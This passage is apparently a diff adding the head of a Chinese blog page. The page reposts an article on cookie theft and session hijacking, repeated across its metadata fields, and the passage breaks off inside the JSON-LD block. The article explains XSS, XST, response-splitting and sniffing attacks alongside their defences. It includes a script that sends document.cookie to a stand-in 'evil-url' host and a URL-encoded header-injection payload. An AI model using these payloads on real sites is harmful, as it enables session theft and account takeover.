@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>cookie窃取和session劫持-WEB前端开发</title>
+    <meta name="description" content="cookie窃取和session劫持2014-08-18 分类：前端工具资源 阅读(59523) 评论(0)Updates2014-08-17 感谢@搞前端的crosser的提醒，加入了HTTP Response Splitting的内容。此篇文章的Presentation戳这里。一、cookie的基本特性如果不...">
+
+    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- <script src="https://kit.fontawesome.com/bff30092be.js" crossorigin="anonymous"></script> -->
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1096581_7o3r6v7yzsh.css">
+    <link rel="stylesheet" href="/assets/css/main.css ">
+    <link rel="canonical" href="https://tldsn.github.io/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/">
+    <link rel="alternate" type="application/rss+xml" title="TLDSN" href="https://tldsn.github.io/feed.xml ">
+    <link type="application/atom+xml" rel="alternate" href="https://tldsn.github.io/feed.xml" title="TLDSN" />
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>cookie窃取和session劫持-WEB前端开发 | TLDSN</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="cookie窃取和session劫持-WEB前端开发" />
+<meta name="author" content="tldsn" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="cookie窃取和session劫持2014-08-18 分类：前端工具资源 阅读(59523) 评论(0)Updates2014-08-17 感谢@搞前端的crosser的提醒，加入了HTTP Response Splitting的内容。此篇文章的Presentation戳这里。一、cookie的基本特性如果不了解cookie，可以先到wikipedia上学习一下。http request浏览器向服务器发起的每个请求都会带上cookie：html 代码:Host: www.example.orgCookie: foo=value1;bar=value2Accept: */*http response服务器给浏览器的返回可以设置cookie：html 代码:HTTP/1.1 200 OKContent-type: text/htmlSet-Cookie: name=valueSet-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT(content of page)二、cookie有关的术语session cookie当cookie没有设置超时时间，那么cookie会在浏览器退出时销毁，这种cookie是session cookie。persistent cookie/tracking cookie设置了超时时间的cookie，会在指定时间销毁，cookie的维持时间可以持续到浏览器退出之后，这种cookie被持久化在浏览器中。很多站点用cookie跟踪用户的历史记录，例如广告类站点会使用cookie记录浏览过哪些内容，搜索引擎会使用cookie记录历史搜索记录，这时也可以称作tracking cookie，因为它被用于追踪用户行为。secure cookie服务器端设置cookie的时候，可以指定secure属性，这时cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有secure cookie。设置secure cookie的方式举例：html 代码:Set-Cookie: foo=bar; Path=/; SecureHttpOnly cookie服务器端设置cookie的时候，也可以指定一个HttpOnly属性。html 代码:Set-Cookie: foo=bar; Path=/; HttpOnly设置了这个属性的cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。third-party cookie第三方cookie的使用场景通常是iframe，例如www.a.com潜入了一个www.ad.com的广告iframe，那么www.ad.com设置的cookie属于不属于www.a.com，被称作第三方cookie。supercookiecookie会从属于一个域名，例如www.a.com，或者属于一个子域，例如b.a.com。但是如果cookie被声明为属于.com会发生什么？这个cookie会在任何.com域名生效。这有很大的安全性问题。这种cookie被称作supercookie。浏览器做出了限制，不允许设置顶级域名cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。现代主流浏览器都很好的处理了supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对supercookie进行攻击啦。zombie cookie/evercookie僵尸cookie是指当用户通过浏览器的设置清除cookie后可以自动重新创建的cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当cookie被删除时，从其他存储中恢复。 evercookie是实现僵尸cookie的主要技术手段。 了解僵尸cookie和evercookie。三、cookie有什么用通常cookie有三种主要的用途。session管理http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是Base Auth，但是这种方式，用户名和密码在每次请求中都会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。所以现在大多数站点采用基于cookie的session管理方式：用户登陆成功后，设置一个唯一的cookie标识本次会话，基于这个标识进行用户授权。只要请求中带有这个标识，都认为是登录态。个性化cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。以前Google退出的iGoogle产品也是一个典型的例子，用户可以拥有自己的Google自定制主页，其中就使用了cookie。user trackingcookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。四、cookie窃取和session劫持本文就cookie的三种用途中session管理的安全问题进行展开。 既然cookie用于维持会话，如果这个cookie被攻击者窃取会发生什么？session被劫持！ 攻击者劫持会话就等于合法登录了你的账户，可以浏览大部分用户资源。最基本的cookie窃取方式：xss漏洞攻击一旦站点中存在可利用的xss漏洞，攻击者可直接利用注入的js脚本获取cookie，进而通过异步请求把标识session id的cookie上报给攻击者。js 代码:var img = document.createElement(&#39;img&#39;);img.src =&#39;http://evil-url?c=&#39;+ encodeURIComponent(document.cookie);document.getElementsByTagName(&#39;body&#39;)[0].appendChild(img);如何寻找XSS漏洞是另外一个话题了，自行google之。 防御 根据上面HttpOnly cookie的介绍，一旦一个cookie被设置为HttpOnly，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个cookie进行session维持，但客户端js对其不可见。那么即使存在xss漏洞也无法简单的利用其进行session劫持攻击了。 但是上面说的是无法利用xss进行简单的攻击，但是也不是没有办法的。既然无法使用document.cookie获取到，可以转而通过其他的方式。下面介绍两种xss结合其他漏洞的攻击方式。xss结合phpinfo页面攻击 大家都知道，利用php开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括cookie信息。 如果开发者没有关闭这个页面，就可以利用xss漏洞向这个页面发起异步请求，获取到页面内容后parse出cookie信息，然后上传给攻击者。 phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。 防御关闭所有phpinfo类dump request信息的页面。XSS + HTTP TRACE = XST这是一种古老的攻击方式，现在已经消失，写在这里可以扩展一下攻防思路。http trace是让我们的web服务器将客户端的所有请求信息返回给客户端的方法。其中包含了HttpOnly的cookie。如果利用xss异步发起trace请求，又可以获取session信息了。之所以说是一种古老的攻击方式，因为现代浏览器考虑到XST的危害都禁止了异步发起trace请求。另外提一点，当浏览器没有禁止异步发起trace的时代，很多开发者都关闭了web server的trace支持来防御XST攻击。但攻击者在特定的情况下还可以绕过，用户使用了代理服务器，而代理服务器没有关闭trace支持，这样又可以trace了。HTTP Response Splitting通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。例如，一个站点接受参数做302跳转：html 代码:www.example.com/?r=http://baidu.comrequest信息：html 代码:GET /example.com?r=http://baidu.com\r\nHTTP/1.1\r\nHost: example.com\r\n\r\nresponse:html 代码:HTTP/1.1 302 Found\r\nLocation: http://baidu.com\r\nContent-Type: text/html\r\n\r\n这样页面就302跳转到百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含\r\n的header信息：html 代码:http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3Eresponse变成了：html 代码:HTTP/1.1 302 Found\r\nLocation: \r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nX-XSS-Protection: 0\r\n&lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;Defaced!&lt;/h1&gt;&lt;/html&gt;Content-Type: text/html\r\n\r\n有两个攻击要点：指定X=XSS-Protection: 0 ，关闭浏览器的xss保护机制。注入脚本防御 针对header的内容做过滤，不能漏掉\r\n，特别是Location，host，referrer等。说到底，这也是一种XSS攻击，只是攻击方式与普通的不太一样。针对header的攻击还可以做SQL注入等，防御的原则是对所有的输入进行sanitize，包括非用户输入的内容，比如referrer这种一般由浏览器带过来的信息，因为请求完全可以被伪造，未必来自浏览器。网络监听(network eavesdropping/network sniffing)以上是利用上层应用的特性的几种攻击方式，cookie不仅存在于上层应用中，更流转于请求中。上层应用获取不到后，攻击者可以转而从网络请求中获取。只要是未使用https加密的网站都可以抓包分析，其中就包含了标识session的cookie。当然，完成网络监听需要满足一定的条件，这又是另外一个话题了。常见的方式：DNS缓存投毒攻击者把要攻击的域名的一个子域映射到攻击者的server，然后想办法让被攻击者访问这个server(XSS request、社会化攻击等)，请求中会带过来所有cookie（包括HttpOnly）。中间人攻击常见的攻击方式是搭建免费wifi，把DHCP服务器指定为攻击者ip，在攻击者机器上可以收到所有请求，不仅可以获取cookie，还可以进行脚本注入。防御使用https。使用https协议的请求都被ssl加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。防御网络监听通常有两种方式：信道加密内容加密https是加密信道，在此信道上传输的内容对中间人都是不可见的。但https是有成本的。内容加密比较好理解，例如对password先加密再传输。但是对于标识session的cookie这种标识性信息是无法通过内容加密得到保护的。那么，使用https的站点就可以高枕无忧了吗？事实上，一些细节上的处理不当同样会暴露出攻击风险。https站点攻击：双协议如果同时支持http和https，那么还是可以使用网络监听http请求获取cookie。 防御只支持https，不支持http。这样就好了吗？No.https站点攻击：301重定向例如www.example.com只支持https协议，当用户直接输入example.com（大部分用户都不会手动输入协议前缀），web server通常的处理是返回301要求浏览器重定向到https://www.example.com。这次301请求是http的！而且带了cookie，这样又将cookie明文暴露在网络上了。 防御1 把标识session的cookie设置成secure。上面提到的secure cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。 然后现实很残酷，很多站点根本无法做到所有的请求都走https。原因有很多，可能是成本考虑，可能是业务需求。 防御2 设置Strict-Transport-Security header，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。更多点此 乌云案例思考如果偷取cookie失败，无法session劫持，攻击者如何再发起攻击？劫持session的目的是拿到登录态，从而获得服务器授权做很多请求，例如账户变更。如果劫持不到session，也能够做授权请求不是也达到攻击的目的了？无需拿到session cookie，跨站发起请求就可以了，这就是CSRF！server通过把用户凭证存储在cookie以维持session，http/https协议每次访问都会自动传输cookie，协议上的缺陷是导致可进行CSRF攻击的根本原因！防御方式：使用anti-forgery token大部分攻击都是提权行为，最基本的提权通过偷取用户名密码，不成功转而窃取session，窃取不成转而跨站攻击，实在不行重放也可以造成危害原文地址：http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html" />
+<meta property="og:description" content="cookie窃取和session劫持2014-08-18 分类：前端工具资源 阅读(59523) 评论(0)Updates2014-08-17 感谢@搞前端的crosser的提醒，加入了HTTP Response Splitting的内容。此篇文章的Presentation戳这里。一、cookie的基本特性如果不了解cookie，可以先到wikipedia上学习一下。http request浏览器向服务器发起的每个请求都会带上cookie：html 代码:Host: www.example.orgCookie: foo=value1;bar=value2Accept: */*http response服务器给浏览器的返回可以设置cookie：html 代码:HTTP/1.1 200 OKContent-type: text/htmlSet-Cookie: name=valueSet-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT(content of page)二、cookie有关的术语session cookie当cookie没有设置超时时间，那么cookie会在浏览器退出时销毁，这种cookie是session cookie。persistent cookie/tracking cookie设置了超时时间的cookie，会在指定时间销毁，cookie的维持时间可以持续到浏览器退出之后，这种cookie被持久化在浏览器中。很多站点用cookie跟踪用户的历史记录，例如广告类站点会使用cookie记录浏览过哪些内容，搜索引擎会使用cookie记录历史搜索记录，这时也可以称作tracking cookie，因为它被用于追踪用户行为。secure cookie服务器端设置cookie的时候，可以指定secure属性，这时cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有secure cookie。设置secure cookie的方式举例：html 代码:Set-Cookie: foo=bar; Path=/; SecureHttpOnly cookie服务器端设置cookie的时候，也可以指定一个HttpOnly属性。html 代码:Set-Cookie: foo=bar; Path=/; HttpOnly设置了这个属性的cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。third-party cookie第三方cookie的使用场景通常是iframe，例如www.a.com潜入了一个www.ad.com的广告iframe，那么www.ad.com设置的cookie属于不属于www.a.com，被称作第三方cookie。supercookiecookie会从属于一个域名，例如www.a.com，或者属于一个子域，例如b.a.com。但是如果cookie被声明为属于.com会发生什么？这个cookie会在任何.com域名生效。这有很大的安全性问题。这种cookie被称作supercookie。浏览器做出了限制，不允许设置顶级域名cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。现代主流浏览器都很好的处理了supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对supercookie进行攻击啦。zombie cookie/evercookie僵尸cookie是指当用户通过浏览器的设置清除cookie后可以自动重新创建的cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当cookie被删除时，从其他存储中恢复。 evercookie是实现僵尸cookie的主要技术手段。 了解僵尸cookie和evercookie。三、cookie有什么用通常cookie有三种主要的用途。session管理http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是Base Auth，但是这种方式，用户名和密码在每次请求中都会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。所以现在大多数站点采用基于cookie的session管理方式：用户登陆成功后，设置一个唯一的cookie标识本次会话，基于这个标识进行用户授权。只要请求中带有这个标识，都认为是登录态。个性化cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。以前Google退出的iGoogle产品也是一个典型的例子，用户可以拥有自己的Google自定制主页，其中就使用了cookie。user trackingcookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。四、cookie窃取和session劫持本文就cookie的三种用途中session管理的安全问题进行展开。 既然cookie用于维持会话，如果这个cookie被攻击者窃取会发生什么？session被劫持！ 攻击者劫持会话就等于合法登录了你的账户，可以浏览大部分用户资源。最基本的cookie窃取方式：xss漏洞攻击一旦站点中存在可利用的xss漏洞，攻击者可直接利用注入的js脚本获取cookie，进而通过异步请求把标识session id的cookie上报给攻击者。js 代码:var img = document.createElement(&#39;img&#39;);img.src =&#39;http://evil-url?c=&#39;+ encodeURIComponent(document.cookie);document.getElementsByTagName(&#39;body&#39;)[0].appendChild(img);如何寻找XSS漏洞是另外一个话题了，自行google之。 防御 根据上面HttpOnly cookie的介绍，一旦一个cookie被设置为HttpOnly，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个cookie进行session维持，但客户端js对其不可见。那么即使存在xss漏洞也无法简单的利用其进行session劫持攻击了。 但是上面说的是无法利用xss进行简单的攻击，但是也不是没有办法的。既然无法使用document.cookie获取到，可以转而通过其他的方式。下面介绍两种xss结合其他漏洞的攻击方式。xss结合phpinfo页面攻击 大家都知道，利用php开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括cookie信息。 如果开发者没有关闭这个页面，就可以利用xss漏洞向这个页面发起异步请求，获取到页面内容后parse出cookie信息，然后上传给攻击者。 phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。 防御关闭所有phpinfo类dump request信息的页面。XSS + HTTP TRACE = XST这是一种古老的攻击方式，现在已经消失，写在这里可以扩展一下攻防思路。http trace是让我们的web服务器将客户端的所有请求信息返回给客户端的方法。其中包含了HttpOnly的cookie。如果利用xss异步发起trace请求，又可以获取session信息了。之所以说是一种古老的攻击方式，因为现代浏览器考虑到XST的危害都禁止了异步发起trace请求。另外提一点，当浏览器没有禁止异步发起trace的时代，很多开发者都关闭了web server的trace支持来防御XST攻击。但攻击者在特定的情况下还可以绕过，用户使用了代理服务器，而代理服务器没有关闭trace支持，这样又可以trace了。HTTP Response Splitting通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。例如，一个站点接受参数做302跳转：html 代码:www.example.com/?r=http://baidu.comrequest信息：html 代码:GET /example.com?r=http://baidu.com\r\nHTTP/1.1\r\nHost: example.com\r\n\r\nresponse:html 代码:HTTP/1.1 302 Found\r\nLocation: http://baidu.com\r\nContent-Type: text/html\r\n\r\n这样页面就302跳转到百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含\r\n的header信息：html 代码:http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3Eresponse变成了：html 代码:HTTP/1.1 302 Found\r\nLocation: \r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nX-XSS-Protection: 0\r\n&lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;Defaced!&lt;/h1&gt;&lt;/html&gt;Content-Type: text/html\r\n\r\n有两个攻击要点：指定X=XSS-Protection: 0 ，关闭浏览器的xss保护机制。注入脚本防御 针对header的内容做过滤，不能漏掉\r\n，特别是Location，host，referrer等。说到底，这也是一种XSS攻击，只是攻击方式与普通的不太一样。针对header的攻击还可以做SQL注入等，防御的原则是对所有的输入进行sanitize，包括非用户输入的内容，比如referrer这种一般由浏览器带过来的信息，因为请求完全可以被伪造，未必来自浏览器。网络监听(network eavesdropping/network sniffing)以上是利用上层应用的特性的几种攻击方式，cookie不仅存在于上层应用中，更流转于请求中。上层应用获取不到后，攻击者可以转而从网络请求中获取。只要是未使用https加密的网站都可以抓包分析，其中就包含了标识session的cookie。当然，完成网络监听需要满足一定的条件，这又是另外一个话题了。常见的方式：DNS缓存投毒攻击者把要攻击的域名的一个子域映射到攻击者的server，然后想办法让被攻击者访问这个server(XSS request、社会化攻击等)，请求中会带过来所有cookie（包括HttpOnly）。中间人攻击常见的攻击方式是搭建免费wifi，把DHCP服务器指定为攻击者ip，在攻击者机器上可以收到所有请求，不仅可以获取cookie，还可以进行脚本注入。防御使用https。使用https协议的请求都被ssl加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。防御网络监听通常有两种方式：信道加密内容加密https是加密信道，在此信道上传输的内容对中间人都是不可见的。但https是有成本的。内容加密比较好理解，例如对password先加密再传输。但是对于标识session的cookie这种标识性信息是无法通过内容加密得到保护的。那么，使用https的站点就可以高枕无忧了吗？事实上，一些细节上的处理不当同样会暴露出攻击风险。https站点攻击：双协议如果同时支持http和https，那么还是可以使用网络监听http请求获取cookie。 防御只支持https，不支持http。这样就好了吗？No.https站点攻击：301重定向例如www.example.com只支持https协议，当用户直接输入example.com（大部分用户都不会手动输入协议前缀），web server通常的处理是返回301要求浏览器重定向到https://www.example.com。这次301请求是http的！而且带了cookie，这样又将cookie明文暴露在网络上了。 防御1 把标识session的cookie设置成secure。上面提到的secure cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。 然后现实很残酷，很多站点根本无法做到所有的请求都走https。原因有很多，可能是成本考虑，可能是业务需求。 防御2 设置Strict-Transport-Security header，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。更多点此 乌云案例思考如果偷取cookie失败，无法session劫持，攻击者如何再发起攻击？劫持session的目的是拿到登录态，从而获得服务器授权做很多请求，例如账户变更。如果劫持不到session，也能够做授权请求不是也达到攻击的目的了？无需拿到session cookie，跨站发起请求就可以了，这就是CSRF！server通过把用户凭证存储在cookie以维持session，http/https协议每次访问都会自动传输cookie，协议上的缺陷是导致可进行CSRF攻击的根本原因！防御方式：使用anti-forgery token大部分攻击都是提权行为，最基本的提权通过偷取用户名密码，不成功转而窃取session，窃取不成转而跨站攻击，实在不行重放也可以造成危害原文地址：http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html" />
+<link rel="canonical" href="https://tldsn.github.io/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/" />
+<meta property="og:url" content="https://tldsn.github.io/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/" />
+<meta property="og:site_name" content="TLDSN" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-07T00:00:00+08:00" />
+<script type="application/ld+json">
+{"mainEntityOfPage":{"@type":"WebPage","@id":"https://tldsn.github.io/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"},"url":"https://tldsn.github.io/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/","author":{"@type":"Person","name":"tldsn"},"description":"cookie窃取和session劫持2014-08-18 分类：前端工具资源 阅读(59523) 评论(0)Updates2014-08-17 感谢@搞前端的crosser的提醒，加入了HTTP Response Splitting的内容。此篇文章的Presentation戳这里。一、cookie的基本特性如果不了解cookie，可以先到wikipedia上学习一下。http request浏览器向服务器发起的每个请求都会带上cookie：html 代码:Host: www.example.orgCookie: foo=value1;bar=value2Accept: */*http response服务器给浏览器的返回可以设置cookie：html 代码:HTTP/1.1 200 OKContent-type: text/htmlSet-Cookie: name=valueSet-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT(content of page)二、cookie有关的术语session cookie当cookie没有设置超时时间，那么cookie会在浏览器退出时销毁，这种cookie是session cookie。persistent cookie/tracking cookie设置了超时时间的cookie，会在指定时间销毁，cookie的维持时间可以持续到浏览器退出之后，这种cookie被持久化在浏览器中。很多站点用cookie跟踪用户的历史记录，例如广告类站点会使用cookie记录浏览过哪些内容，搜索引擎会使用cookie记录历史搜索记录，这时也可以称作tracking cookie，因为它被用于追踪用户行为。secure cookie服务器端设置cookie的时候，可以指定secure属性，这时cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有secure cookie。设置secure cookie的方式举例：html 代码:Set-Cookie: foo=bar; Path=/; SecureHttpOnly cookie服务器端设置cookie的时候，也可以指定一个HttpOnly属性。html 代码:Set-Cookie: foo=bar; Path=/; HttpOnly设置了这个属性的cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。third-party cookie第三方cookie的使用场景通常是iframe，例如www.a.com潜入了一个www.ad.com的广告iframe，那么www.ad.com设置的cookie属于不属于www.a.com，被称作第三方cookie。supercookiecookie会从属于一个域名，例如www.a.com，或者属于一个子域，例如b.a.com。但是如果cookie被声明为属于.com会发生什么？这个cookie会在任何.com域名生效。这有很大的安全性问题。这种cookie被称作supercookie。浏览器做出了限制，不允许设置顶级域名cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。现代主流浏览器都很好的处理了supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对supercookie进行攻击啦。zombie cookie/evercookie僵尸cookie是指当用户通过浏览器的设置清除cookie后可以自动重新创建的cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当cookie被删除时，从其他存储中恢复。 evercookie是实现僵尸cookie的主要技术手段。 了解僵尸cookie和evercookie。三、cookie有什么用通常cookie有三种主要的用途。session管理http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是Base Auth，但是这种方式，用户名和密码在每次请求中都会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。所以现在大多数站点采用基于cookie的session管理方式：用户登陆成功后，设置一个唯一的cookie标识本次会话，基于这个标识进行用户授权。只要请求中带有这个标识，都认为是登录态。个性化cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。以前Google退出的iGoogle产品也是一个典型的例子，用户可以拥有自己的Google自定制主页，其中就使用了cookie。user trackingcookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。四、cookie窃取和session劫持本文就cookie的三种用途中session管理的安全问题进行展开。 既然cookie用于维持会话，如果这个cookie被攻击者窃取会发生什么？session被劫持！ 攻击者劫持会话就等于合法登录了你的账户，可以浏览大部分用户资源。最基本的cookie窃取方式：xss漏洞攻击一旦站点中存在可利用的xss漏洞，攻击者可直接利用注入的js脚本获取cookie，进而通过异步请求把标识session id的cookie上报给攻击者。js 代码:var img = document.createElement(&#39;img&#39;);img.src =&#39;http://evil-url?c=&#39;+ encodeURIComponent(document.cookie);document.getElementsByTagName(&#39;body&#39;)[0].appendChild(img);如何寻找XSS漏洞是另外一个话题了，自行google之。 防御 根据上面HttpOnly cookie的介绍，一旦一个cookie被设置为HttpOnly，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个cookie进行session维持，但客户端js对其不可见。那么即使存在xss漏洞也无法简单的利用其进行session劫持攻击了。 但是上面说的是无法利用xss进行简单的攻击，但是也不是没有办法的。既然无法使用document.cookie获取到，可以转而通过其他的方式。下面介绍两种xss结合其他漏洞的攻击方式。xss结合phpinfo页面攻击 大家都知道，利用php开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括cookie信息。 如果开发者没有关闭这个页面，就可以利用xss漏洞向这个页面发起异步请求，获取到页面内容后parse出cookie信息，然后上传给攻击者。 phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。 防御关闭所有phpinfo类dump request信息的页面。XSS + HTTP TRACE = XST这是一种古老的攻击方式，现在已经消失，写在这里可以扩展一下攻防思路。http trace是让我们的web服务器将客户端的所有请求信息返回给客户端的方法。其中包含了HttpOnly的cookie。如果利用xss异步发起trace请求，又可以获取session信息了。之所以说是一种古老的攻击方式，因为现代浏览器考虑到XST的危害都禁止了异步发起trace请求。另外提一点，当浏览器没有禁止异步发起trace的时代，很多开发者都关闭了web server的trace支持来防御XST攻击。但攻击者在特定的情况下还可以绕过，用户使用了代理服务器，而代理服务器没有关闭trace支持，这样又可以trace了。HTTP Response Splitting通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。例如，一个站点接受参数做302跳转：html 代码:www.example.com/?r=http://baidu.comrequest信息：html 代码:GET /example.com?r=http://baidu.com\\r\\nHTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\nresponse:html 代码:HTTP/1.1 302 Found\\r\\nLocation: http://baidu.com\\r\\nContent-Type: text/html\\r\\n\\r\\n这样页面就302跳转到百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含\\r\\n的header信息：html 代码:http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3Eresponse变成了：html 代码:HTTP/1.1 302 Found\\r\\nLocation: \\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nX-XSS-Protection: 0\\r\\n&lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;Defaced!&lt;/h1&gt;&lt;/html&gt;Content-Type: text/html\\r\\n\\r\\n有两个攻击要点：指定X=XSS-Protection: 0 ，关闭浏览器的xss保护机制。注入脚本防御 针对header的内容做过滤，不能漏掉\\r\\n，特别是Location，host，referrer等。说到底，这也是一种XSS攻击，只是攻击方式与普通的不太一样。针对header的攻击还可以做SQL注入等，防御的原则是对所有的输入进行sanitize，包括非用户输入的内容，比如referrer这种一般由浏览器带过来的信息，因为请求完全可以被伪造，未必来自浏览器。网络监听(network eavesdropping/network sniffing)以上是利用上层应用的特性的几种攻击方式，cookie不仅存在于上层应用中，更流转于请求中。上层应用获取不到后，攻击者可以转而从网络请求中获取。只要是未使用https加密的网站都可以抓包分析，其中就包含了标识session的cookie。当然，完成网络监听需要满足一定的条件，这又是另外一个话题了。常见的方式：DNS缓存投毒攻击者把要攻击的域名的一个子域映射到攻击者的server，然后想办法让被攻击者访问这个server(XSS request、社会化攻击等)，请求中会带过来所有cookie（包括HttpOnly）。中间人攻击常见的攻击方式是搭建免费wifi，把DHCP服务器指定为攻击者ip，在攻击者机器上可以收到所有请求，不仅可以获取cookie，还可以进行脚本注入。防御使用https。使用https协议的请求都被ssl加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。防御网络监听通常有两种方式：信道加密内容加密https是加密信道，在此信道上传输的内容对中间人都是不可见的。但https是有成本的。内容加密比较好理解，例如对password先加密再传输。但是对于标识session的cookie这种标识性信息是无法通过内容加密得到保护的。那么，使用https的站点就可以高枕无忧了吗？事实上，一些细节上的处理不当同样会暴露出攻击风险。https站点攻击：双协议如果同时支持http和https，那么还是可以使用网络监听http请求获取cookie。 防御只支持https，不支持http。这样就好了吗？No.https站点攻击：301重定向例如www.example.com只支持https协议，当用户直接输入example.com（大部分用户都不会手动输入协议前缀），web server通常的处理是返回301要求浏览器重定向到https://www.example.com。这次301请求是http的！而且带了cookie，这样又将cookie明文暴露在网络上了。 防御1 把标识session的cookie设置成secure。上面提到的secure cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。 